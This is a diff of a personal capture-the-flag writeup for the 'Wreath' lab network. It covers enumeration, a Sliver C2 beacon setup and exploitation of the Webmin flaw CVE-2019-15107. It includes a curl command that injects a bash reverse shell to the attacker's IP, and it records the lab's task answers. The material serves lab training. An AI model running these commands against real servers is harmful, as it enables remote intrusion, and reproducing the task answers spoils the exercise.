@@ -1,5 +1,7 @@
 # Wreath Writeup
 
+![](mugshot.png)
+
 Name: Wreath
 Date:  
 Difficulty:  
@@ -23,12 +25,12 @@ Beyond Root:
 #### Brief
 
 *There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.*
-## Recon
+## Webserver Enumeration
 
 The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
 ![ping](Screenshots/ping.png)
 
-Masscan missed the top 10000 plus port once on 300 rate and on 100 rate... 
+Masscan missed the top 10000 plus port once on 300 rate and on 100 rate... I miss read that 
 
 nikto - found redirect https://thomaswreath.thm
 
@@ -39,21 +41,86 @@ nikto - found redirect https://thomaswreath.thm
 Nuclei find open redirect to a weird domain... 
 `[open-redirect] [http] [medium] http://10.200.96.200/.evil.com [redirect=".evil.com"]`
 
+Mr Wreath is backdoored - this should not resolve
+![](backdooredman.png)
+
+`mx.evil.com`  is mail server DNS recond also found by Nuclei the `thomaswreath.thm.evil.com`
+
 [[CVE-2018-11784-http___10.200.96.200__interact.sh]]
 
 ![](stillcantfindthatplus15kport.png)
 
+![](poorladisfromyorkshire.png)
+
 #### Task 5 Webserver Enumeration
 
 How many of the first 15000 ports are open on the target?
-
+```
+5
+```
 What OS does Nmap think is running?
+```
+centos
+```
+
+What site does the server try to redirect you to?
+```
+https://thomaswreath.thm
+```
 
 What is Thomas' mobile phone number?
 
+![](verydoxable.png)
+
+```
++447821548812
+```
+
 What server version does Nmap detect as running here?
+```
+MiniServ 1.890 (Webmin httpd)
+```
 
 What is the CVE number for this exploit?
+```
+CVE-2019-15107
+```
+
+## Webserver Exploitation
+
+I am prepared doing this machine and do not need to learn Empire or Chisel (just revising chisel) and will use Silver instead.
+
+```go
+generate beacon --mtls 10.50.76.121:2222 --arch amd64 --os linux --save /home/kali/Wreath/
+mtls -L 10.50.76.121  -l 2222
+
+// In Directory pack to reduce file size
+upx WIDE-EYED_TRAM
+
+```
+
+
+[Exploit DB for Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)](https://www.exploit-db.com/exploits/47230), because OSCP's one Metasploit usage on one machine   
+
+![](foxsincodeexplained.png)
+
+So we do need to worry about python virtual environments for compatibility
+```bash
+curl  -k https://10.200.96.200:10000/password_change.cgi -d 'user=gotroot&pam=&expired=2|echo ""; bash -i >& /dev/tcp/10.50.76.121/10000 0>&1' -H 'Referer: https://10.200.96.200:10000/session_login.cgi'
+```
+
+Muirland also has an exploit to use - a better way to do this would be to create a virtual environment
+```bash
+git clone https://github.com/MuirlandOracle/CVE-2019-15107
+cd CVE-2019-15107 
+python3 -m venv .venv
+source .venv/bin/activate
+
+pip3 install .
+```
+
+
+
 #### Task 6 Webserver Exploitation
 
 #### Task 7 Pivoting What is Pivoting?
